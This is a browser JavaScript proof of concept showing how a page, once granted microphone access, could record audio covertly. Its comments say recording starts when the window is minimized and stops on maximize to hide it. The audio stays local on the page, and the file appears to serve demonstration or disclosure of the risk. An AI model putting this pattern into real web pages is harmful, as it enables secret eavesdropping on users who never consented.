// local microphone stream and recorder on that stream
var mediaStream = null;
var mediaRecorder = null;
// elements to display output or receive input
var messageList = document.getElementById('messages');
var justifyButton = document.getElementById('justifyButton');
// object to store recorded data in with utility functions
var sink = {
    _chunks: [],
    getDataAsBlob: function(){
        return new Blob(this._chunks, { 'type' : 'audio/ogg; codecs=opus' });
    },
    getDataAsSrcUrl: function(){
        return window.URL.createObjectURL(this.getDataAsBlob());
    },
    getRecordFunction: function(){
        this._chunks = [];
        var that = this;
        return function(e){ that._chunks.push(e.data) };
    }
};

// the user must have some reason to give the page at least one time access to his microphone
// this button is just a placeholder for this useful function that the user wants to use.
// it just records 1 second and stops then, like a user that now does not want to use this function any more
justifyButton.addEventListener("click", function(){
    startRecording();
    showMessage("The user uses the microphone (desired by the user)");
    var delay = setTimeout(function(){
        stopRecording();
        showMessage("The user stops using the microphone");
        clearTimeout(delay);
    },1000);
});

// when the window is maximized, stop to hide that you were recording
window.onmaximize = stopRecording;

// when the window gets minimized, start to record without the user noticing it
window.onminimize = startRecording;

/**
 * start the designated recorder
 * */
function startRecording(){
    getRecorder().then(function record(recorder){
        showMessage('start recording now');
        recorder.start();
        recorder.ondataavailable = sink.getRecordFunction();
        recorder.onstop = function(){
            showAudio(sink.getDataAsSrcUrl());
            showMessage('Recorded data has been set to audio element');
            clear();
        };
    });
}

/**
 * stop the designated recorder
 * */
function stopRecording(){
    getRecorder().then(function finish(recorder){
        showMessage('Recorder stops');
        var attempts = 10;
        var poll = setInterval(function () {
            if (attempts <= 0) {
                if (recorder.state === 'recording') recorder.stop();
                clearInterval(poll);
            }
            attempts--;
        }, 500);
    });
}


/**
 * Singleton function to get a microphone audio stream
 * @return Promise returns a promise that resolves to a stream or an error that occurred getting the user media
 * */
function getMedia(){
    if(mediaStream){
        return Promise.resolve(mediaStream);
    }else{
        return navigator.mediaDevices.getUserMedia({
            audio: true,
            video: false
        }).then(function saveStreamToVar(stream){
            mediaStream = stream;
            return stream;
        });
    }
}

/**
 * Singleton function to get a recorder on the microphone stream
 * @return Promise returns a promise that resolves with a media recorder that records the local microphone stream
 * */
function getRecorder(){
    if(mediaRecorder){
        return Promise.resolve(mediaRecorder);
    }else{
        return getMedia().then(function saveRecorderToVar(stream){
            mediaRecorder = new MediaRecorder(stream);
            return mediaRecorder;
        });
    }
}

/**
 * Resets the streams and users so that the page is not recording any more
 * */
function clear(){
    if(mediaRecorder && mediaRecorder.state === 'recording'){
        mediaRecorder.stop();
    }
    if(mediaStream) mediaStream.getAudioTracks().forEach(function stopAllTracks(track){
        if(track.stop) track.stop()
    });
    mediaRecorder = null;
    mediaStream = null;
}


// ---------------- only utility functions down here ----------------------

/**
 * display text on page (with the date)
 * @param content the text to show
 * */
function showMessage(content){
    var li = document.createElement('li');
    li.setAttribute('class','message card');
    var section = document.createElement('section');
    var footer = document.createElement('footer');
    footer.innerHTML = (new Date()).toLocaleTimeString('de-De',{hour: '2-digit', minute: '2-digit', second: '2-digit'});
    var article = document.createElement('article');
    if(content instanceof Node){
        article.appendChild(content);
    }else{
        article.innerHTML = content;
    }
    li.appendChild(section);
    section.appendChild(article);
    section.appendChild(footer);
    messageList.insertBefore(li, messageList.firstChild);
}

/**
 * display an audio file as message
 * @param url the url as String to the audio file source
 * */
function showAudio(url){
    var audio = document.createElement('audio');
    audio.setAttribute("controls","");
    audio.setAttribute("src",url);
    showMessage(audio);
}